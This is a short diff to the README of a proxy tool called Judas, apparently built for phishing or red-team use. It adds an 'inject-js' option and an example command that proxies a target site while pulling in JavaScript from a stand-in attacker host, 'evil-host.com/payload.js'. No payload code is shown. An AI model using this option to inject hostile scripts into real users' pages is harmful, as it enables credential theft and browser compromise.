@@ -26,3 +26,10 @@ Example:
 ```
 ./proxy --target https://target-url.com --address=0.0.0.0:8080
 ```
+
+Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```inject-js``` argument.
+
+Example:
+```
+./proxy --target https://target-url.com --inject-js https://evil-host.com/payload.js
+```
